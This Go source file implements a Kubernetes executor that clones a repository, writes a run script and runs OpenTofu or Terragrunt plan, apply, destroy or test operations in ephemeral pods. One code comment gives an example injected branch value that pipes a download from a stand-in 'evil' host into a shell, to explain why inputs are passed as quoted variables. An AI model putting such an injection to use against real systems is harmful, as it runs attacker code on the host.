package executor

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log/slog"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/nanohype/portal/internal/conv"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/watch"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

// KubernetesExecutor runs OpenTofu in ephemeral K8s pods.
type KubernetesExecutor struct {
	client      kubernetes.Interface
	namespace   string
	image       string
	imagePrefix string
}

type KubernetesExecutorConfig struct {
	Namespace   string // K8s namespace for executor pods
	Image       string // Base executor image (e.g. "portal-executor:tofu-1.11")
	ImagePrefix string // Image prefix for per-version images (e.g. "portal-executor")
}

func NewKubernetesExecutor(cfg KubernetesExecutorConfig) (*KubernetesExecutor, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, fmt.Errorf("failed to get in-cluster config: %w", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, fmt.Errorf("failed to create kubernetes client: %w", err)
	}

	ns := cfg.Namespace
	if ns == "" {
		ns = "portal"
	}
	image := cfg.Image
	if image == "" {
		image = "portal-executor:tofu-1.11"
	}

	imagePrefix := cfg.ImagePrefix
	if imagePrefix == "" {
		imagePrefix = "portal-executor"
	}

	return &KubernetesExecutor{
		client:      clientset,
		namespace:   ns,
		image:       image,
		imagePrefix: imagePrefix,
	}, nil
}

// commitMarker prefixes the one line the run script prints with the commit it
// checked out, so the worker can read it back out of the pod log.
const commitMarker = "===PORTAL_COMMIT==="

// commitMarkerRe matches that line anywhere in the log. The commit is reported
// right after the clone rather than at the end, so unlike the state and plan
// markers this one is cut out of the middle of the output rather than
// truncating everything after it.
var commitMarkerRe = regexp.MustCompile(`(?m)^` + commitMarker + `([0-9a-fA-F]{7,64})\r?\n?`)

func (e *KubernetesExecutor) Execute(ctx context.Context, params ExecuteParams) (*ExecuteResult, error) {
	logger := slog.With("run_id", params.RunID, "operation", params.Operation)

	// A pin that is not an object id never reaches git. The value is referenced
	// as a quoted shell variable so it cannot be read as shell, but git itself
	// would still read a leading-dash value as an option, and a pin portal
	// cannot resolve has to stop the run rather than degrade to branch head.
	if params.CommitSHA != "" && !IsCommitSHA(params.CommitSHA) {
		return nil, fmt.Errorf("refusing to check out %q: not a git commit id", params.CommitSHA)
	}

	podName := fmt.Sprintf("portal-run-%s", params.RunID)

	// Build OpenTofu command script
	script := e.buildScript(params)

	// Build environment variables
	envVars := []corev1.EnvVar{
		{Name: "TF_IN_AUTOMATION", Value: "true"},
		{Name: "TF_INPUT", Value: "false"},
		{Name: "PORTAL_RUN_ID", Value: params.RunID},
		{Name: "PORTAL_OPERATION", Value: params.Operation},
		// Repo URL / branch / working dir are passed as env vars (never inlined
		// into run.sh) so the script can reference them as quoted "$VAR" — a
		// branch or working_dir containing shell metacharacters is then a
		// literal value to git/cd, not executable shell. See buildScript.
		{Name: "PORTAL_REPO_URL", Value: params.RepoURL},
		{Name: "PORTAL_REPO_BRANCH", Value: params.RepoBranch},
		{Name: "PORTAL_WORKING_DIR", Value: params.WorkingDir},
		{Name: "PORTAL_COMMIT_SHA", Value: params.CommitSHA},
		// Terragrunt-specific defaults. Harmless for tofu runs (tofu
		// ignores TG_*-prefixed env vars). See local.go for rationale.
		{Name: "TG_NON_INTERACTIVE", Value: "true"},
		{Name: "TG_BACKEND_BOOTSTRAP", Value: "true"},
	}
	for _, v := range params.Variables {
		switch v.Category {
		case "env":
			envVars = append(envVars, corev1.EnvVar{Name: v.Key, Value: v.Value})
		case "terraform":
			// Mirror the local executor: terraform vars are always passed
			// as TF_VAR_* env so they flow into both tofu mode (redundant
			// with portal.auto.tfvars; file wins via precedence) and
			// terragrunt mode (only source; terragrunt's own inputs win
			// for any key it sets).
			envVars = append(envVars, corev1.EnvVar{Name: "TF_VAR_" + v.Key, Value: v.Value})
		}
	}

	// Build tfvars content for ConfigMap
	var tfvarsContent string
	var tfVarLines []string
	for _, v := range params.Variables {
		if v.Category == "terraform" {
			if isHCLLiteral(v.Value) {
				tfVarLines = append(tfVarLines, fmt.Sprintf("%s = %s", v.Key, v.Value))
			} else {
				tfVarLines = append(tfVarLines, fmt.Sprintf("%s = %q", v.Key, v.Value))
			}
		}
	}
	if len(tfVarLines) > 0 {
		tfvarsContent = strings.Join(tfVarLines, "\n") + "\n"
	}

	// Generate encryption override if enabled
	var encryptionOverride string
	if params.StateEncryptionPassphrase != "" {
		encryptionOverride = GenerateEncryptionOverride(params.StateEncryptionPassphrase)
	}

	// Create ConfigMap with script, tfvars, encryption, and previous state
	cmData := map[string]string{
		"run.sh": script,
	}
	if tfvarsContent != "" {
		cmData["portal.auto.tfvars"] = tfvarsContent
	}
	if encryptionOverride != "" {
		cmData["portal_encryption_override.tf"] = encryptionOverride
	}
	if len(params.PreviousState) > 0 {
		cmData["terraform.tfstate"] = string(params.PreviousState)
	}

	cm := &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: e.namespace,
			Labels: map[string]string{
				"app.kubernetes.io/managed-by": "portal",
				"portal/run-id":                params.RunID,
			},
		},
		Data: cmData,
	}

	// For upload workspaces, store the archive as binary data in the ConfigMap
	if params.Source == "upload" && len(params.ArchiveData) > 0 {
		cm.BinaryData = map[string][]byte{
			"source.tar.gz": params.ArchiveData,
		}
	}

	_, err := e.client.CoreV1().ConfigMaps(e.namespace).Create(ctx, cm, metav1.CreateOptions{})
	if err != nil {
		return nil, fmt.Errorf("failed to create configmap: %w", err)
	}
	defer e.client.CoreV1().ConfigMaps(e.namespace).Delete(ctx, podName, metav1.DeleteOptions{})

	// Create Pod
	pod := e.buildPod(podName, params, envVars)

	_, err = e.client.CoreV1().Pods(e.namespace).Create(ctx, pod, metav1.CreateOptions{})
	if err != nil {
		return nil, fmt.Errorf("failed to create pod: %w", err)
	}
	defer e.client.CoreV1().Pods(e.namespace).Delete(ctx, podName, metav1.DeleteOptions{})

	logger.Info("executor pod created", "pod", podName)
	params.LogCallback([]byte(fmt.Sprintf("Executor pod %s created, waiting for start...\r\n", podName)))

	// Wait for pod to be running
	if err := e.waitForPodPhase(ctx, podName, corev1.PodRunning, 5*time.Minute); err != nil {
		return nil, fmt.Errorf("pod failed to start: %w", err)
	}

	// Stream logs
	output, err := e.streamPodLogs(ctx, podName, params.LogCallback)
	if err != nil {
		return nil, fmt.Errorf("failed to stream logs: %w", err)
	}

	// Wait for pod to complete
	if err := e.waitForPodPhase(ctx, podName, corev1.PodSucceeded, 30*time.Minute); err != nil {
		return nil, fmt.Errorf("pod failed: %w", err)
	}

	// Parse result
	result := &ExecuteResult{Output: output}

	// Lift the executed commit out of the log and drop the marker line from what
	// the user reads.
	if m := commitMarkerRe.FindStringSubmatch(output); m != nil {
		result.CommitSHA = m[1]
		output = commitMarkerRe.ReplaceAllString(output, "")
		result.Output = output
	}

	planSummaryRe := regexp.MustCompile(`Plan: (\d+) to add, (\d+) to change, (\d+) to destroy`)
	matches := planSummaryRe.FindStringSubmatch(output)
	if len(matches) == 4 {
		added, _ := strconv.Atoi(matches[1])
		changed, _ := strconv.Atoi(matches[2])
		deleted, _ := strconv.Atoi(matches[3])
		result.ResourcesAdded = conv.Int32(added)
		result.ResourcesChanged = conv.Int32(changed)
		result.ResourcesDeleted = conv.Int32(deleted)
	}

	// For plan: extract JSON plan between markers
	if params.Operation == "plan" {
		jsonMarker := "===PORTAL_PLAN_JSON_BEGIN==="
		jsonEndMarker := "===PORTAL_PLAN_JSON_END==="
		if idx := strings.Index(output, jsonMarker); idx != -1 {
			jsonData := output[idx+len(jsonMarker):]
			if endIdx := strings.Index(jsonData, jsonEndMarker); endIdx != -1 {
				jsonData = strings.TrimSpace(jsonData[:endIdx])
				result.PlanJSON = []byte(jsonData)
				// Remove JSON plan data from visible output
				result.Output = output[:idx]
			}
		}
	}

	// For apply/destroy: extract raw state and decrypted state JSON from markers
	if params.Operation == "apply" || params.Operation == "destroy" {
		stateMarker := "===PORTAL_STATE_BEGIN==="
		stateEndMarker := "===PORTAL_STATE_END==="
		if idx := strings.Index(output, stateMarker); idx != -1 {
			stateData := output[idx+len(stateMarker):]
			if endIdx := strings.Index(stateData, stateEndMarker); endIdx != -1 {
				stateData = strings.TrimSpace(stateData[:endIdx])
				result.StateFile = []byte(stateData)
				result.Output = output[:idx]
			}
		}

		jsonMarker := "===PORTAL_STATE_JSON_BEGIN==="
		jsonEndMarker := "===PORTAL_STATE_JSON_END==="
		if idx := strings.Index(result.Output, jsonMarker); idx != -1 {
			jsonData := result.Output[idx+len(jsonMarker):]
			if endIdx := strings.Index(jsonData, jsonEndMarker); endIdx != -1 {
				result.StateJSON = []byte(strings.TrimSpace(jsonData[:endIdx]))
				result.Output = result.Output[:idx]
			}
		}
	}

	logger.Info("executor pod completed", "pod", podName)
	return result, nil
}

func (e *KubernetesExecutor) buildScript(params ExecuteParams) string {
	var sb strings.Builder

	sb.WriteString("#!/bin/sh\nset -e\n\n")

	// Get source: clone repo or extract uploaded archive.
	//
	// RepoURL/RepoBranch/WorkingDir are referenced as quoted shell variables
	// (PORTAL_* env vars set on the container), never interpolated into the
	// script text — so a value like `main;curl evil|sh` is passed verbatim to
	// git/cd instead of being parsed as shell. The `--branch=` form and the `--`
	// separator also stop a leading-dash value from being read as a git option.
	if params.Source == "upload" {
		sb.WriteString("echo 'Extracting uploaded configuration...'\n")
		sb.WriteString("cd /work\n")
		sb.WriteString("tar xzf /config/source.tar.gz\n")
		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
	} else {
		sb.WriteString("echo \"Cloning $PORTAL_REPO_URL (branch: $PORTAL_REPO_BRANCH)...\"\n")
		sb.WriteString("git clone --depth 1 --branch=\"$PORTAL_REPO_BRANCH\" -- \"$PORTAL_REPO_URL\" /work\n")
		// Move onto the pinned commit when the run carries one. The shallow
		// clone almost never contains it — the branch has moved since the plan —
		// so fetch that one object, falling back to the branch's full history
		// for a server that refuses a by-id fetch. `set -e` makes a failed
		// checkout fail the pod, which is the point: a commit the branch no
		// longer contains must stop the run, not silently become branch head.
		sb.WriteString("if [ -n \"$PORTAL_COMMIT_SHA\" ]; then\n")
		sb.WriteString("  echo \"Checking out pinned commit $PORTAL_COMMIT_SHA...\"\n")
		sb.WriteString("  git -C /work fetch --depth 1 origin \"$PORTAL_COMMIT_SHA\" || git -C /work fetch --unshallow origin\n")
		sb.WriteString("  git -C /work checkout --detach \"$PORTAL_COMMIT_SHA\"\n")
		sb.WriteString("fi\n")
		// Report the commit actually executed on one line, so the worker can pin
		// the run to it and a later apply of the same run gets this tree.
		sb.WriteString("echo \"" + commitMarker + "$(git -C /work rev-parse HEAD)\"\n")
		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
	}

	// Detect wrapper. terragrunt.hcl at the leaf → terragrunt drives the run
	// (it walks parent dirs and renders terraform itself); otherwise tofu does.
	sb.WriteString("if [ -f terragrunt.hcl ]; then\n")
	sb.WriteString("  BIN=terragrunt\n")
	sb.WriteString("  echo 'Detected terragrunt.hcl — using terragrunt wrapper.'\n")
	sb.WriteString("  echo '[portal] TG_NON_INTERACTIVE=true — terragrunt prompts auto-confirmed.'\n")
	sb.WriteString("  echo '[portal] TG_BACKEND_BOOTSTRAP=true — remote state bucket will be auto-created if missing.'\n")
	sb.WriteString("else\n")
	sb.WriteString("  BIN=tofu\n")
	sb.WriteString("fi\n\n")

	// Copy tfvars if present. Skipped in terragrunt mode — terragrunt's
	// `inputs = {}` block is the source of truth.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/portal.auto.tfvars ]; then cp /config/portal.auto.tfvars .; fi\n\n")

	// Restore previous state if present. Skipped in terragrunt mode —
	// state lives in the remote backend; a local file just confuses init.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/terraform.tfstate ]; then\n")
	sb.WriteString("  cp /config/terraform.tfstate .\n")
	sb.WriteString("  echo 'Restored previous state file.'\n")
	sb.WriteString("fi\n\n")

	// Copy encryption override if present. Skipped in terragrunt mode —
	// terragrunt's source copy pulls leaf .tf files into the rendered cache,
	// so the override would silently encrypt the user's remote state with
	// portal's per-workspace passphrase and break `dependency` blocks across
	// sibling workspaces.
	sb.WriteString("if [ \"$BIN\" = \"tofu\" ] && [ -f /config/portal_encryption_override.tf ]; then\n")
	sb.WriteString("  cp /config/portal_encryption_override.tf .\n")
	sb.WriteString("  echo 'State encryption enabled (AES-GCM).'\n")
	sb.WriteString("fi\n\n")

	// Init
	sb.WriteString("echo \"\\$ $BIN init\"\n")
	sb.WriteString("$BIN init -no-color\n\n")

	// Validate
	sb.WriteString("echo \"\\$ $BIN validate\"\n")
	sb.WriteString("$BIN validate -no-color\n\n")

	// Operation
	sb.WriteString("if [ -f portal.auto.tfvars ]; then VAR_FILE='-var-file=portal.auto.tfvars'; fi\n\n")

	switch params.Operation {
	case "test":
		sb.WriteString("echo \"\\$ $BIN output -json\"\n")
		sb.WriteString("$BIN output -json > outputs.json 2>/dev/null || echo \"Warning: $BIN output failed (continuing anyway)\"\n\n")
		sb.WriteString("if [ ! -f smoke-test.sh ]; then\n")
		sb.WriteString("  echo 'smoke-test.sh not found in working directory'\n")
		sb.WriteString("  exit 1\n")
		sb.WriteString("fi\n")
		sb.WriteString("chmod +x smoke-test.sh\n")
		sb.WriteString("echo '$ ./smoke-test.sh'\n")
		sb.WriteString("./smoke-test.sh\n")
	case "plan":
		sb.WriteString("echo \"\\$ $BIN plan\"\n")
		// -detailed-exitcode: 0=no changes, 1=error, 2=changes detected
		// Capture exit code explicitly — only fail on exit 1 (error)
		sb.WriteString("set +e\n")
		sb.WriteString("$BIN plan -no-color -detailed-exitcode -out=planfile $VAR_FILE\n")
		sb.WriteString("PLAN_EXIT=$?\n")
		sb.WriteString("set -e\n")
		sb.WriteString("if [ \"$PLAN_EXIT\" -eq 1 ]; then echo 'Plan failed with errors'; exit 1; fi\n")
		sb.WriteString("\n# Output JSON plan for capture\n")
		sb.WriteString("if [ -f planfile ]; then\n")
		sb.WriteString("  echo '===PORTAL_PLAN_JSON_BEGIN==='\n")
		sb.WriteString("  $BIN show -json planfile\n")
		sb.WriteString("  echo '===PORTAL_PLAN_JSON_END==='\n")
		sb.WriteString("fi\n")
	case "apply":
		sb.WriteString("echo \"\\$ $BIN apply\"\n")
		sb.WriteString("$BIN apply -no-color -auto-approve $VAR_FILE\n")
		sb.WriteString("\n# Output raw state (may be encrypted) for restoration\n")
		sb.WriteString("if [ -f terraform.tfstate ]; then\n")
		sb.WriteString("  echo '===PORTAL_STATE_BEGIN==='\n")
		sb.WriteString("  cat terraform.tfstate\n")
		sb.WriteString("  echo '===PORTAL_STATE_END==='\n")
		sb.WriteString("fi\n")
		sb.WriteString("# Output decrypted state for resource browsing\n")
		sb.WriteString("echo '===PORTAL_STATE_JSON_BEGIN==='\n")
		sb.WriteString("$BIN state pull\n")
		sb.WriteString("echo '===PORTAL_STATE_JSON_END==='\n")
	case "destroy":
		sb.WriteString("echo \"\\$ $BIN destroy\"\n")
		sb.WriteString("$BIN destroy -no-color -auto-approve $VAR_FILE\n")
		sb.WriteString("\n# Output raw state for restoration\n")
		sb.WriteString("if [ -f terraform.tfstate ]; then\n")
		sb.WriteString("  echo '===PORTAL_STATE_BEGIN==='\n")
		sb.WriteString("  cat terraform.tfstate\n")
		sb.WriteString("  echo '===PORTAL_STATE_END==='\n")
		sb.WriteString("fi\n")
		sb.WriteString("# Output decrypted state for resource browsing\n")
		sb.WriteString("echo '===PORTAL_STATE_JSON_BEGIN==='\n")
		sb.WriteString("$BIN state pull\n")
		sb.WriteString("echo '===PORTAL_STATE_JSON_END==='\n")
	}

	return sb.String()
}

// resolveImage returns an image tag for the given tofu version.
// If a version is specified, it builds "{imagePrefix}:tofu-{version}";
// otherwise it falls back to the default image.
func (e *KubernetesExecutor) resolveImage(tofuVersion string) string {
	if tofuVersion != "" {
		return fmt.Sprintf("%s:tofu-%s", e.imagePrefix, tofuVersion)
	}
	return e.image
}

func (e *KubernetesExecutor) buildPod(name string, params ExecuteParams, envVars []corev1.EnvVar) *corev1.Pod {
	volumes := []corev1.Volume{
		{
			Name: "config",
			VolumeSource: corev1.VolumeSource{
				ConfigMap: &corev1.ConfigMapVolumeSource{
					LocalObjectReference: corev1.LocalObjectReference{Name: name},
					DefaultMode:          int32Ptr(0755),
				},
			},
		},
		{
			Name: "work",
			VolumeSource: corev1.VolumeSource{
				EmptyDir: &corev1.EmptyDirVolumeSource{},
			},
		},
	}

	volumeMounts := []corev1.VolumeMount{
		{Name: "config", MountPath: "/config", ReadOnly: true},
		{Name: "work", MountPath: "/work"},
	}

	return &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: e.namespace,
			Labels: map[string]string{
				"app.kubernetes.io/managed-by": "portal",
				"app.kubernetes.io/component":  "executor",
				"portal/run-id":                params.RunID,
				"portal/workspace-id":          params.WorkspaceID,
				"portal/operation":             params.Operation,
			},
		},
		Spec: corev1.PodSpec{
			RestartPolicy: corev1.RestartPolicyNever,
			Containers: []corev1.Container{
				{
					Name:         "tofu",
					Image:        e.resolveImage(params.TofuVersion),
					Command:      []string{"/bin/sh", "/config/run.sh"},
					Env:          envVars,
					VolumeMounts: volumeMounts,
					Resources: corev1.ResourceRequirements{
						Requests: corev1.ResourceList{
							corev1.ResourceCPU:    resource.MustParse("250m"),
							corev1.ResourceMemory: resource.MustParse("256Mi"),
						},
						Limits: corev1.ResourceList{
							corev1.ResourceCPU:    resource.MustParse("1"),
							corev1.ResourceMemory: resource.MustParse("1Gi"),
						},
					},
				},
			},
			Volumes:                       volumes,
			AutomountServiceAccountToken:  boolPtr(false),
			TerminationGracePeriodSeconds: int64Ptr(30),
		},
	}
}

func (e *KubernetesExecutor) waitForPodPhase(ctx context.Context, podName string, phase corev1.PodPhase, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	pod, err := e.client.CoreV1().Pods(e.namespace).Get(ctx, podName, metav1.GetOptions{})
	if err != nil {
		return err
	}
	if pod.Status.Phase == phase {
		return nil
	}
	if pod.Status.Phase == corev1.PodFailed {
		return fmt.Errorf("pod failed")
	}

	watcher, err := e.client.CoreV1().Pods(e.namespace).Watch(ctx, metav1.ListOptions{
		FieldSelector: fmt.Sprintf("metadata.name=%s", podName),
	})
	if err != nil {
		return err
	}
	defer watcher.Stop()

	for {
		select {
		case <-ctx.Done():
			return fmt.Errorf("timeout waiting for pod phase %s", phase)
		case event, ok := <-watcher.ResultChan():
			if !ok {
				return fmt.Errorf("watch channel closed")
			}
			if event.Type == watch.Deleted {
				return fmt.Errorf("pod was deleted")
			}
			pod, ok := event.Object.(*corev1.Pod)
			if !ok {
				continue
			}
			if pod.Status.Phase == phase {
				return nil
			}
			if pod.Status.Phase == corev1.PodFailed {
				return fmt.Errorf("pod failed")
			}
			if phase == corev1.PodRunning && pod.Status.Phase == corev1.PodSucceeded {
				return nil
			}
		}
	}
}

func (e *KubernetesExecutor) streamPodLogs(ctx context.Context, podName string, logCallback func([]byte)) (string, error) {
	req := e.client.CoreV1().Pods(e.namespace).GetLogs(podName, &corev1.PodLogOptions{
		Follow: true,
	})

	stream, err := req.Stream(ctx)
	if err != nil {
		return "", err
	}
	defer stream.Close()

	var output strings.Builder
	scanner := bufio.NewScanner(stream)
	scanner.Buffer(make([]byte, 64*1024), 1024*1024)

	for scanner.Scan() {
		line := scanner.Text()
		output.WriteString(line)
		output.WriteString("\n")
		logCallback([]byte(line + "\r\n"))
	}

	if scanner.Err() != nil && scanner.Err() != io.EOF {
		remaining, _ := io.ReadAll(stream)
		if len(remaining) > 0 {
			output.Write(remaining)
			logCallback(remaining)
		}
	}

	return output.String(), nil
}

func int32Ptr(i int32) *int32 { return &i }
func int64Ptr(i int64) *int64 { return &i }
func boolPtr(b bool) *bool    { return &b }
